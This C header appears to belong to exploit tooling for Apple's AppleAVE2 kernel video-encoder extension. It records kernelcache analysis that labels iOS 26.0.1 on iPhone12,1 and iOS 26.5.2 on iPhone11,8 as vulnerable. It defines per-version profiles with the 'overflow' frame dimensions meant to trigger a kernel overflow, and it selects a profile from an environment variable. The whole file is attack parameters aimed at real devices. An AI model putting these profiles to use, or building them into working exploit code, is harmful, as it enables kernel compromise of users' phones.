/*
 * ave2_profiles.h — per-OS AppleAVE2 version profiles
 *
 * Device evidence (kernelcache unpack, 2026-10-22):
 *   iPhone12,1 / iOS 26.0.1 (J375c build 23A340-ish kernel, [[904.76.7]])
 *     - kernelcache_J375c_26.0.1.im4p unpacked
 *     - "LRB size overflow" count=0  (no fixed assert)
 *     - "frame dimension out of range" count=0 (no fixed product clamp log)
 *     - "frame dimension is out of range" count=7 (capability gate, both builds)
 *   iPhone11,8 / iOS 26.5.2 (23F84)
 *     - kernelcache-23F84 unpacked (kernelcache_research_26.5.2_iphone11.bin)
 *     - 9xx version string found: "905.36.1" ONLY
 *     - same signature counts: fixed-only strings absent, capability gate present
 *   => both are VULNERABLE profiles; version string is the only delta.
 */

#ifndef AVE2_PROFILES_H
#define AVE2_PROFILES_H

#include <string.h>

typedef struct {
    const char *name;        /* human label            */
    const char *kext_ver;    /* version-gate string    */
    uint32_t    w;           /* overflow width         */
    uint32_t    h;           /* overflow height        */
    uint32_t    w_ctrl;      /* control width          */
    uint32_t    h_ctrl;      /* control height         */
} ave2_profile_t;

/* iOS 26.0.1 — iPhone12,1 (A13) — AppleAVE2 [[904.76.7]] */
static const ave2_profile_t AVE2_PROFILE_2601 = {
    .name    = "iOS 26.0.1 iPhone12,1",
    .kext_ver = "904.76.7",
    .w       = 64656, .h = 8080,
    .w_ctrl  = 65520, .h_ctrl = 8193,
};

/* iOS 26.5.2 — iPhone11,8 (A12) — AppleAVE2 [[905.36.1]] (23F84) */
static const ave2_profile_t AVE2_PROFILE_2652 = {
    .name    = "iOS 26.5.2 iPhone11,8",
    .kext_ver = "905.36.1",
    .w       = 64656, .h = 8080,
    .w_ctrl  = 65520, .h_ctrl = 8193,
};

static const ave2_profile_t *ave2_profile_all[] = {
    &AVE2_PROFILE_2601,
    &AVE2_PROFILE_2652,
    NULL,
};

/* Resolve profile by env AVE2_PROFILE ("26.0.1" / "26.5.2") or explicit index. */
static const ave2_profile_t *ave2_profile_get(int idx) {
    const char *e = getenv("AVE2_PROFILE");
    if (e) {
        if (strstr(e, "26.0")) return &AVE2_PROFILE_2601;
        if (strstr(e, "26.5")) return &AVE2_PROFILE_2652;
    }
    if (idx == 1) return &AVE2_PROFILE_2652;
    return &AVE2_PROFILE_2601;
}

#endif /* AVE2_PROFILES_H */
